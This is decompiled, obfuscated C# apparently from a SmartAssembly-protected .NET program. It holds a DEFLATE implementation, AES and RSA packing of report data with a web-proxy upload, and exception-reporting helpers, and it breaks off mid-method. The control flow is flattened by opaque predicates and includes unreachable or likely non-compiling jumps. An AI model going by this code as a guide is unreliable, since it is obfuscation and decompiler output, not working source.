using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns0;
using ns1;
using ns10;
using ns11;
using ns2;
using ns5;
using ns6;
using ns7;
using ns8;
using ns9;

internal class Class33
{
	static bool smethod_0(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		while (true)
		{
			if (num < processes.Length)
			{
				Process process = processes[num];
				if (process.ProcessName.StartsWith(string_0))
				{
					if (!aoKmv57A4wSEkvDOgia())
					{
						break;
					}
					switch (4)
					{
					case 3:
						break;
					case 1:
					case 4:
						return true;
					case 5:
						goto IL_005a;
					default:
						goto end_IL_004b;
					}
				}
				else
				{
					num = checked(num + 1);
				}
				continue;
			}
			goto IL_005a;
			IL_005a:
			return false;
			continue;
			end_IL_004b:
			break;
		}
		bool result = default(bool);
		return result;
	}

	static void smethod_1(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class33.smethod_73(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static bool smethod_2(byte[] byte_0, Class28 class28_0, Class28.Class32 class32_0)
	{
		Class28.Class30 class2 = default(Class28.Class30);
		while (true)
		{
			byte[] byte_;
			try
			{
				byte_ = Class33.smethod_71(byte_0);
			}
			catch (Exception)
			{
				Class33.smethod_113(class28_0, Enum1.const_0, Class15.string_0);
				return false;
			}
			byte[] array = Class33.smethod_4(byte_, Class14.smethod_0(1322));
			while (true)
			{
				IL_0090:
				if (array != null)
				{
					Class33.smethod_40(class28_0, Enum1.const_1);
					Class41 @class = new Class41(Class14.smethod_0(1648));
					while (true)
					{
						if (class28_0.iwebProxy_0 != null)
						{
							while (true)
							{
								IL_006d:
								@class.iwebProxy_0 = class28_0.iwebProxy_0;
								int num = 2;
								if (!aoKmv57A4wSEkvDOgia())
								{
									break;
								}
								while (true)
								{
									switch (num)
									{
									case 0:
										break;
									default:
										num = 1;
										if (!XdRJXa7sy9ebEBASZRt())
										{
											continue;
										}
										goto IL_00d9;
									case 1:
									case 3:
										goto IL_006d;
									case 6:
										goto end_IL_006d;
									case 5:
										goto IL_0090;
									case 2:
									case 4:
										goto IL_00bb;
									case 7:
										goto IL_00d9;
									}
									break;
								}
								goto end_IL_0086;
								continue;
								end_IL_006d:
								break;
							}
							continue;
						}
						goto IL_00bb;
						IL_00d9:
						return class2.bool_0;
						IL_00bb:
						class2 = new Class28.Class30(class28_0, array, @class, class32_0);
						Class33.smethod_88(@class, (Delegate12)class2.method_0);
						goto IL_00d9;
						continue;
						end_IL_0086:
						break;
					}
					break;
				}
				Class33.smethod_113(class28_0, Enum1.const_0, Class27.string_0);
				return false;
			}
		}
	}

	static void smethod_3(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class33.smethod_73(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static byte[] smethod_4(byte[] byte_0, string string_0)
	{
		while (!string_0.StartsWith(Class14.smethod_0(1697)))
		{
			RijndaelManaged rijndaelManaged = null;
			while (true)
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = null;
				while (true)
				{
					MemoryStream memoryStream = null;
					CryptoStream cryptoStream = null;
					int num = 6;
					if (!XdRJXa7sy9ebEBASZRt())
					{
					}
					while (true)
					{
						switch (num)
						{
						default:
							num = 0;
							if (!XdRJXa7sy9ebEBASZRt())
							{
							}
							continue;
						case 0:
						case 3:
							break;
						case 2:
						case 5:
							goto end_IL_0036;
						case 1:
							goto end_IL_0048;
						case 4:
							goto end_IL_004c;
						case 6:
							try
							{
								rijndaelManaged = new RijndaelManaged();
								rSACryptoServiceProvider = new RSACryptoServiceProvider();
								rSACryptoServiceProvider.FromXmlString(string_0);
								rijndaelManaged.GenerateKey();
								rijndaelManaged.GenerateIV();
								byte[] array = new byte[48];
								Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
								Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
								memoryStream = new MemoryStream();
								try
								{
									byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
									memoryStream.WriteByte(1);
									memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
									memoryStream.Write(array2, 0, array2.Length);
								}
								catch (CryptographicException)
								{
									try
									{
										byte[] array3 = new byte[16];
										byte[] array4 = new byte[16];
										Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
										Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
										byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
										byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
										byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
										memoryStream.WriteByte(2);
										memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
										memoryStream.Write(array5, 0, array5.Length);
										memoryStream.Write(array6, 0, array6.Length);
										memoryStream.Write(array7, 0, array7.Length);
									}
									catch (CryptographicException)
									{
										Class27.string_0 = Class14.smethod_0(1795);
										return null;
									}
								}
								cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
								cryptoStream.Write(byte_0, 0, byte_0.Length);
								cryptoStream.FlushFinalBlock();
								return memoryStream.ToArray();
							}
							catch (Exception ex3)
							{
								Class27.string_0 = Class14.smethod_0(2001) + ex3.Message;
								return null;
							}
							finally
							{
								rijndaelManaged?.Clear();
								rSACryptoServiceProvider?.Clear();
								memoryStream?.Close();
								cryptoStream?.Close();
							}
						}
						break;
					}
					continue;
					end_IL_0036:
					break;
				}
				continue;
				end_IL_0048:
				break;
			}
			continue;
			end_IL_004c:
			break;
		}
		Class27.string_0 = Class14.smethod_0(1702);
		return null;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long ShowWindowAsync(long long_0, long long_1);

	static Icon smethod_5()
	{
		try
		{
			return Class33.smethod_134();
		}
		catch (Exception)
		{
			return Class33.smethod_149(Class14.smethod_0(2018));
		}
	}

	static byte[] smethod_6(string string_0, byte[] byte_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			int num = byte_0[byte_0.Length - 1] ^ 0x70;
			byte[] bytes = Encoding.Default.GetBytes(string_0);
			int num2 = byte_0.Length - 1;
			int num3 = default(int);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = (byte)(byte_0[i] ^ num ^ bytes[num3]);
				num3 = ((num3 != string_0.Length - 1) ? (num3 + 1) : 0);
			}
			return (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
		}
	}

	static bool smethod_7(bool bool_0, Class15.Class24 class24_0, bool bool_1)
	{
		bool flag2 = default(bool);
		do
		{
			Class33.smethod_97(class24_0);
			int num;
			if (!bool_1)
			{
				num = 0;
				goto IL_000a;
			}
			if (XdRJXa7sy9ebEBASZRt())
			{
			}
			switch (2)
			{
			case 0:
			case 2:
				goto IL_004d;
			case 4:
				goto end_IL_0000;
			}
			continue;
			IL_004d:
			num = ((class24_0.int_7 == class24_0.int_8) ? 1 : 0);
			goto IL_000a;
			IL_000a:
			bool flag = (byte)num != 0;
			flag2 = Class33.smethod_44((byte)num != 0, bool_0, class24_0);
			if (!class24_0.class25_0.IsFlushed)
			{
				break;
			}
			continue;
			end_IL_0000:
			break;
		}
		while (flag2);
		return flag2;
	}

	static void smethod_8()
	{
		try
		{
			Class33.smethod_102();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_9(Class38 class38_0)
	{
		try
		{
			Graphics val = ((Control)class38_0).CreateGraphics();
			try
			{
				string text = ((Control)class38_0).get_Text();
				Font font = ((Control)class38_0).get_Font();
				int width = ((Control)class38_0).get_Width();
				int num = Class33.smethod_98(text, val, width, font);
				if (num > 0)
				{
					((Control)class38_0).set_Height(num);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static void smethod_10(IWebProxy iwebProxy_0, Class41 class41_0)
	{
		class41_0.iwebProxy_0 = iwebProxy_0;
	}

	static int smethod_11(Font font_0, int int_0, Graphics graphics_0, string string_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	static void smethod_12(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static void smethod_13(string string_0, EventArgs1 eventArgs1_0, string string_1)
	{
		Class33.smethod_47(string_1, string_0, eventArgs1_0.class29_0);
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long ReadConsoleInputA(long long_0, ref IntPtr intptr_0, long long_1, ref long long_2);

	static string smethod_14(object object_0)
	{
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int num)
			{
				return num.ToString(Class14.smethod_0(2031));
			}
			if (object_0 is long num2)
			{
				return num2.ToString(Class14.smethod_0(2031));
			}
			if (object_0 is short)
			{
				goto IL_01b7;
			}
			uint num3 = default(uint);
			if (object_0 is uint)
			{
				num3 = (uint)object_0;
				goto IL_0168;
			}
			if (object_0 is ulong num4)
			{
				return num4.ToString(Class14.smethod_0(2031));
			}
			if (object_0 is ushort)
			{
				goto IL_0184;
			}
			if (object_0 is byte b)
			{
				return b.ToString(Class14.smethod_0(2031));
			}
			if (object_0 is sbyte b2)
			{
				return b2.ToString(Class14.smethod_0(2031));
			}
			if (object_0 is IntPtr intPtr)
			{
				long num5 = intPtr.ToInt64();
				int num6 = 6;
				if (!XdRJXa7sy9ebEBASZRt())
				{
				}
				string result = default(string);
				while (true)
				{
					switch (num6)
					{
					default:
						num6 = 0;
						if (!XdRJXa7sy9ebEBASZRt())
						{
						}
						continue;
					case 1:
						break;
					case 4:
						goto IL_0184;
					case 6:
						return num5.ToString(Class14.smethod_0(2031));
					case 10:
						goto IL_01b7;
					case 0:
						return result;
					case 2:
					case 3:
						return result;
					case 5:
						return result;
					case 7:
					case 8:
						return result;
					case 9:
						return result;
					case 11:
						return result;
					}
					break;
				}
				goto IL_0168;
			}
			if (object_0 is UIntPtr)
			{
				return ((UIntPtr)object_0).ToUInt64().ToString(Class14.smethod_0(2031));
			}
			goto end_IL_0000;
			IL_0168:
			return num3.ToString(Class14.smethod_0(2031));
			IL_0184:
			return ((ushort)object_0).ToString(Class14.smethod_0(2031));
			IL_01b7:
			return ((short)object_0).ToString(Class14.smethod_0(2031));
			end_IL_0000:;
		}
		catch
		{
		}
		return string.Empty;
	}

	static void smethod_15(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class33.smethod_112(Class14.smethod_0(2036));
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	static void smethod_16(int[] int_0, Class15.Class22.Class23 class23_0)
	{
		class23_0.byte_0 = new byte[class23_0.short_0.Length];
		int num = 6;
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_0077;
		}
		goto IL_0255;
		IL_0255:
		int[] array = default(int[]);
		int num2 = default(int);
		int num7 = default(int);
		int num4 = default(int);
		int num6 = default(int);
		int num10 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		while (true)
		{
			switch (num)
			{
			case 13:
				break;
			case 8:
				goto IL_0044;
			case 1:
				goto IL_006e;
			case 7:
				goto IL_0077;
			case 12:
				array[num2 - 1] = 0;
				num7 = num2 - 1;
				goto case 4;
			case 4:
			case 11:
				while (num7 >= 0)
				{
					if (int_0[2 * num7 + 1] != -1)
					{
						int num8 = array[num7] + 1;
						if (num8 > class23_0.int_3)
						{
							num8 = class23_0.int_3;
							num4++;
						}
						array[int_0[2 * num7]] = (array[int_0[2 * num7 + 1]] = num8);
					}
					else
					{
						int num9 = array[num7];
						class23_0.int_2[num9 - 1]++;
						class23_0.byte_0[int_0[2 * num7]] = (byte)array[num7];
					}
					num7--;
				}
				if (num4 != 0)
				{
					num6 = class23_0.int_3 - 1;
					goto IL_019a;
				}
				return;
			case 10:
				class23_0.int_2[++num6]++;
				num4 -= 1 << class23_0.int_3 - 1 - num6;
				if (num4 > 0 && num6 < class23_0.int_3 - 1)
				{
					goto IL_0179;
				}
				if (num4 > 0)
				{
					goto IL_019a;
				}
				goto default;
			default:
				class23_0.int_2[class23_0.int_3 - 1] += num4;
				class23_0.int_2[class23_0.int_3 - 2] -= num4;
				goto case 3;
			case 3:
				num10 = 2 * num3;
				goto IL_006e;
			case 0:
			case 6:
				num2 = int_0.Length / 2;
				num = 2;
				if (!XdRJXa7sy9ebEBASZRt())
				{
					continue;
				}
				goto case 12;
			case 5:
				num5++;
				goto IL_0211;
			case 2:
				{
					num3 = (num2 + 1) / 2;
					num4 = 0;
					num5 = 0;
					goto IL_0211;
				}
				IL_0211:
				if (num5 < class23_0.int_3)
				{
					class23_0.int_2[num5] = 0;
					goto case 5;
				}
				array = new int[num2];
				num = 12;
				if (aoKmv57A4wSEkvDOgia())
				{
					continue;
				}
				goto case 0;
				IL_0179:
				class23_0.int_2[num6]--;
				goto case 10;
				IL_019a:
				while (class23_0.int_2[--num6] == 0)
				{
				}
				goto IL_0179;
			}
			break;
		}
		goto IL_0025;
		IL_0025:
		int num11 = default(int);
		int num12 = default(int);
		if (num11 != 0)
		{
			num12 = class23_0.int_2[num11 - 1];
			goto IL_0044;
		}
		return;
		IL_006e:
		num11 = class23_0.int_3;
		goto IL_0025;
		IL_0044:
		int num13 = default(int);
		if (num12 > 0)
		{
			num13 = 2 * int_0[num10++];
			goto IL_0077;
		}
		num11--;
		goto IL_0025;
		IL_0077:
		if (int_0[num13 + 1] != -1)
		{
			goto IL_0044;
		}
		class23_0.byte_0[int_0[num13]] = (byte)num11;
		num12--;
		num = 8;
		if (XdRJXa7sy9ebEBASZRt())
		{
			goto IL_006e;
		}
		goto IL_0255;
	}

	static int smethod_17(Class15.Class19 class19_0, Class15.Class17 class17_0)
	{
		int num2;
		int num;
		if ((num = Class33.smethod_81(class17_0, 9)) >= 0)
		{
			int result = default(int);
			while ((num2 = class19_0.short_0[num]) >= 0)
			{
				if (aoKmv57A4wSEkvDOgia())
				{
					switch (5)
					{
					case 4:
						break;
					case 5:
						Class33.smethod_77(class17_0, num2 & 0xF);
						goto case 2;
					case 2:
						return num2 >> 4;
					case 8:
						goto IL_00f1;
					case 0:
					case 6:
						goto IL_010f;
					default:
						goto IL_0123;
					}
					continue;
				}
				goto IL_0123;
				IL_0123:
				return result;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class33.smethod_81(class17_0, int_)) >= 0)
			{
				num2 = class19_0.short_0[num3 | (num >> 9)];
				Class33.smethod_77(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			int availableBits = class17_0.AvailableBits;
			num = Class33.smethod_81(class17_0, availableBits);
			num2 = class19_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= availableBits)
			{
				Class33.smethod_77(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int availableBits2 = class17_0.AvailableBits;
		goto IL_00f1;
		IL_00f1:
		num = Class33.smethod_81(class17_0, availableBits2);
		num2 = class19_0.short_0[num];
		if (num2 < 0 || (num2 & 0xF) > availableBits2)
		{
			return -1;
		}
		goto IL_010f;
		IL_010f:
		Class33.smethod_77(class17_0, num2 & 0xF);
		return num2 >> 4;
	}

	static void smethod_18(Class15.Class18 class18_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class18_0.byte_0[class18_0.int_0++] = class18_0.byte_0[int_0++];
			class18_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static int smethod_19(Class15.Class18 class18_0)
	{
		return 32768 - class18_0.int_1;
	}

	static void smethod_20(Class15.Class22 class22_0)
	{
		int num = 0;
		int num6 = default(int);
		while (num < class22_0.int_1)
		{
			int num2 = class22_0.byte_1[num] & 0xFF;
			while (true)
			{
				int num3 = class22_0.short_0[num];
				if (num3-- != 0)
				{
					int num4 = Class33.smethod_150(num2, class22_0);
					if (aoKmv57A4wSEkvDOgia())
					{
						switch (1)
						{
						case 0:
						case 3:
							break;
						case 1:
						{
							Class33.smethod_108(class22_0.class23_0, num4);
							int num5 = (num4 - 261) / 4;
							if (num5 > 0 && num5 <= 5)
							{
								Class33.smethod_144(class22_0.class25_0, num2 & ((1 << num5) - 1), num5);
							}
							goto case 2;
						}
						case 2:
						case 5:
							num6 = Class33.smethod_23(class22_0, num3);
							Class33.smethod_108(class22_0.class23_1, num6);
							goto default;
						default:
						{
							int num5 = num6 / 2 - 1;
							if (num5 > 0)
							{
								Class33.smethod_144(class22_0.class25_0, num3 & ((1 << num5) - 1), num5);
							}
							goto IL_00ed;
						}
						case 6:
							goto IL_00ed;
						case 7:
							goto end_IL_00f1;
						}
						continue;
					}
				}
				else
				{
					Class33.smethod_108(class22_0.class23_0, num2);
				}
				goto IL_00ed;
				IL_00ed:
				num++;
				break;
			}
			continue;
			end_IL_00f1:
			break;
		}
		Class33.smethod_108(class22_0.class23_0, 256);
	}

	static void smethod_21(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static void smethod_22(Class15.Class25 class25_0)
	{
		if (class25_0.int_2 > 0)
		{
			class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
			if (class25_0.int_2 > 8)
			{
				class25_0.byte_0[class25_0.int_1++] = (byte)(class25_0.uint_0 >> 8);
			}
		}
		class25_0.uint_0 = 0u;
		class25_0.int_2 = 0;
	}

	static int smethod_23(Class15.Class22 class22_0, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static int smethod_24(int int_0, int int_1, byte[] byte_0, Class15.Class16 class16_0)
	{
		int num = 0;
		do
		{
			if (class16_0.int_4 != 11)
			{
				int num2 = Class33.smethod_63(int_1, class16_0.class18_0, int_0, byte_0);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class33.smethod_38(class16_0) || (Class33.smethod_90(class16_0.class18_0) > 0 && class16_0.int_4 != 11));
		return num;
	}

	static void smethod_25(int int_0, byte[] byte_0, Class15.Class18 class18_0, int int_1)
	{
		if (class18_0.int_1 > 0)
		{
			throw new InvalidOperationException();
		}
		if (int_1 > 32768)
		{
			int_0 += int_1 - 32768;
			int_1 = 32768;
		}
		Array.Copy(byte_0, int_0, class18_0.byte_0, 0, int_1);
		class18_0.int_0 = int_1 & 0x7FFF;
	}

	static byte[] smethod_26(Class29 class29_0)
	{
		return class29_0.method_4();
	}

	static void smethod_27(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class33.smethod_73(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static int smethod_28(Class15.Stream0 stream0_0)
	{
		return Class33.smethod_120(stream0_0) | (Class33.smethod_120(stream0_0) << 16);
	}

	static Exception smethod_29(Exception exception_0, object[] object_0)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == Class14.smethod_0(2049))
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class33.smethod_73(exception_0, object_0);
			}
			Class39.Handler.method_3(exception_0, bool_1: true, bool_2: false);
		}
		catch
		{
		}
		return (Exception)new SoapException(exception_0.Message, SoapException.ServerFaultCode);
	}

	static void smethod_30(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class33.smethod_73(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static void smethod_31(Class15.Class22.Class23 class23_0, Class15.Class22.Class23 class23_1)
	{
		int num = -1;
		int num2 = 0;
		int num6 = default(int);
		while (num2 < class23_0.int_1)
		{
			int num3 = 1;
			int num4 = class23_0.byte_0[num2];
			int num5;
			if (num4 == 0)
			{
				num5 = 138;
				num6 = 3;
				goto IL_0058;
			}
			num5 = 6;
			int num7 = 3;
			if (!XdRJXa7sy9ebEBASZRt())
			{
				goto IL_006d;
			}
			goto IL_00f0;
			IL_00ed:
			if (num == 0)
			{
				if (num3 <= 10)
				{
					class23_1.short_0[17]++;
				}
				else
				{
					class23_1.short_0[18]++;
				}
				continue;
			}
			goto IL_00f0;
			IL_00f0:
			class23_1.short_0[16]++;
			continue;
			IL_0058:
			num = num4;
			num7 = 8;
			if (!aoKmv57A4wSEkvDOgia())
			{
				continue;
			}
			goto IL_006d;
			IL_006d:
			switch (num7)
			{
			case 6:
				if (num != num4)
				{
					class23_1.short_0[num4]++;
					num3 = 0;
				}
				goto IL_0058;
			case 3:
				num6 = 3;
				goto case 6;
			case 8:
				num2++;
				while (num2 < class23_0.int_1 && num == class23_0.byte_0[num2])
				{
					num2++;
					if (++num3 >= num5)
					{
						break;
					}
				}
				if (num3 < num6)
				{
					goto default;
				}
				goto IL_00ed;
			default:
				class23_1.short_0[num] += (short)num3;
				continue;
			case 7:
				break;
			case 0:
			case 1:
			case 5:
			case 9:
				continue;
			}
			goto IL_00f0;
		}
	}

	static void smethod_32()
	{
		string text = Class14.smethod_0(257);
	}

	static void smethod_33(Class15.Class18 class18_0, int int_0)
	{
		if (class18_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class18_0.byte_0[class18_0.int_0++] = (byte)int_0;
		class18_0.int_0 &= 32767;
	}

	static ICryptoTransform smethod_34(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	internal static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class42.Struct14 struct14_0, int int_1);

	static void smethod_35(Class15.Class19 class19_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int num2 = default(int);
		int num6 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		int num14 = default(int);
		int num13 = default(int);
		int num16 = default(int);
		int num17 = default(int);
		while (true)
		{
			int[] array2 = new int[16];
			int num = 0;
			while (true)
			{
				IL_01b3:
				if (num < byte_0.Length)
				{
					num2 = byte_0[num];
					if (num2 <= 0)
					{
						goto IL_002c;
					}
				}
				else
				{
					int num3 = 0;
					int num4 = 512;
					int num5 = 1;
					while (true)
					{
						int num7;
						if (num5 <= 15)
						{
							array2[num5] = num3;
							num3 += array[num5] << 16 - num5;
							if (num5 >= 10)
							{
								num6 = array2[num5] & 0x1FF80;
								num7 = 5;
								if (aoKmv57A4wSEkvDOgia())
								{
									goto IL_0120;
								}
							}
							goto IL_0183;
						}
						class19_0.short_0 = new short[num4];
						num8 = 512;
						num9 = 15;
						goto IL_008b;
						IL_01d9:
						if (num10 >= byte_0.Length)
						{
							return;
						}
						num11 = byte_0[num10];
						if (num11 != 0)
						{
							num3 = array2[num11];
							num12 = Class33.smethod_139(num3);
							if (num11 <= 9)
							{
								goto IL_01fe;
							}
							num13 = class19_0.short_0[num12 & 0x1FF];
							num14 = 1 << (num13 & 0xF);
							goto IL_023c;
						}
						goto IL_0268;
						IL_0183:
						num5++;
						continue;
						IL_023c:
						num13 = -(num13 >> 4);
						do
						{
							class19_0.short_0[num13 | (num12 >> 9)] = (short)((num10 << 4) | num11);
							num12 += 1 << num11;
						}
						while (num12 < num14);
						goto IL_0273;
						IL_0120:
						switch (num7)
						{
						case 6:
							break;
						default:
							goto IL_008b;
						case 4:
						{
							for (int i = num16; i < num17; i += 128)
							{
								class19_0.short_0[Class33.smethod_139(i)] = (short)((-num8 << 4) | num9);
								num8 += 1 << num9 - 9;
							}
							num9--;
							goto IL_008b;
						}
						case 5:
						{
							int num15 = num3 & 0x1FF80;
							num4 += num15 - num6 >> 16 - num5;
							goto IL_0183;
						}
						case 1:
							goto IL_0183;
						case 3:
							continue;
						case 13:
							goto IL_01b3;
						case 8:
							goto end_IL_01b3;
						case 0:
							num10 = 0;
							goto IL_01d9;
						case 14:
							goto IL_01d9;
						case 2:
						case 9:
							goto IL_020d;
						case 7:
							goto IL_023c;
						case 10:
						case 11:
							goto IL_0273;
						}
						break;
						IL_008b:
						if (num9 < 10)
						{
							num7 = 0;
							if (XdRJXa7sy9ebEBASZRt())
							{
							}
						}
						else
						{
							num17 = num3 & 0x1FF80;
							num3 -= array[num9] << 16 - num9;
							num16 = num3 & 0x1FF80;
							num7 = 4;
							if (!aoKmv57A4wSEkvDOgia())
							{
								goto IL_0273;
							}
						}
						goto IL_0120;
						IL_01fe:
						class19_0.short_0[num12] = (short)((num10 << 4) | num11);
						goto IL_020d;
						IL_020d:
						num12 += 1 << num11;
						if (num12 < 512)
						{
							goto IL_01fe;
						}
						goto IL_0273;
						IL_0273:
						array2[num11] = num3 + (1 << 16 - num11);
						goto IL_0268;
						IL_0268:
						num10++;
						goto IL_01d9;
					}
				}
				array[num2]++;
				goto IL_002c;
				IL_002c:
				num++;
				continue;
				end_IL_01b3:
				break;
			}
		}
	}

	static void smethod_36(Exception exception_0, object object_0, object object_1)
	{
		Class33.smethod_73(exception_0, new object[2] { object_0, object_1 });
	}

	static Class15.Class19 smethod_37(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_3];
		Array.Copy(class20_0.byte_1, 0, array, 0, class20_0.int_3);
		return new Class15.Class19(array);
	}

	static bool smethod_38(Class15.Class16 class16_0)
	{
		switch (class16_0.int_4)
		{
		case 2:
		{
			if (class16_0.bool_0)
			{
				class16_0.int_4 = 12;
				return false;
			}
			int num = Class33.smethod_81(class16_0.class17_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class33.smethod_77(class16_0.class17_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class16_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class33.smethod_127(class16_0.class17_0);
				class16_0.int_4 = 3;
				break;
			case 1:
				class16_0.class19_0 = Class15.Class19.class19_0;
				class16_0.class19_1 = Class15.Class19.class19_1;
				class16_0.int_4 = 7;
				break;
			case 2:
				class16_0.class20_0 = new Class15.Class20();
				class16_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class16_0.int_8 = Class33.smethod_81(class16_0.class17_0, 16)) < 0)
			{
				return false;
			}
			Class33.smethod_77(class16_0.class17_0, 16);
			class16_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class33.smethod_81(class16_0.class17_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class33.smethod_77(class16_0.class17_0, 16);
			class16_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class33.smethod_82(class16_0.class18_0, class16_0.class17_0, class16_0.int_8);
			class16_0.int_8 -= num3;
			if (class16_0.int_8 == 0)
			{
				class16_0.int_4 = 2;
				return true;
			}
			return !class16_0.class17_0.IsNeedingInput;
		}
		case 6:
			if (!Class33.smethod_52(class16_0.class20_0, class16_0.class17_0))
			{
				return false;
			}
			class16_0.class19_0 = Class33.smethod_37(class16_0.class20_0);
			class16_0.class19_1 = Class33.smethod_137(class16_0.class20_0);
			class16_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class33.smethod_106(class16_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static void smethod_39(string string_0, Class29 class29_0, object object_0)
	{
		class29_0.dictionary_0.Add(string_0, object_0);
	}

	static void smethod_40(Class28 class28_0, Enum1 enum1_0)
	{
		Class33.smethod_113(class28_0, enum1_0, string.Empty);
	}

	static void smethod_41(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class33.smethod_73(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static int smethod_42(Class15.Class25 class25_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class25_0.int_2 >= 8)
		{
			goto IL_006d;
		}
		goto IL_00a8;
		IL_00a8:
		while (true)
		{
			IL_00a8_2:
			if (int_1 <= class25_0.int_1 - class25_0.int_0)
			{
				Array.Copy(class25_0.byte_0, class25_0.int_0, byte_0, int_0, int_1);
				class25_0.int_0 += int_1;
				int num = 6;
				if (!aoKmv57A4wSEkvDOgia())
				{
					goto IL_00f1;
				}
				while (true)
				{
					switch (num)
					{
					default:
						num = 4;
						if (!XdRJXa7sy9ebEBASZRt())
						{
						}
						continue;
					case 0:
					case 5:
						break;
					case 1:
					case 2:
						goto IL_00a8_2;
					case 4:
						goto IL_00c0;
					case 3:
						goto IL_00e3;
					case 6:
						goto IL_00f1;
					}
					break;
				}
				break;
			}
			goto IL_00c0;
			IL_00e3:
			class25_0.int_0 = 0;
			class25_0.int_1 = 0;
			goto IL_00f1;
			IL_00f1:
			return int_1;
			IL_00c0:
			int_1 = class25_0.int_1 - class25_0.int_0;
			Array.Copy(class25_0.byte_0, class25_0.int_0, byte_0, int_0, int_1);
			goto IL_00e3;
		}
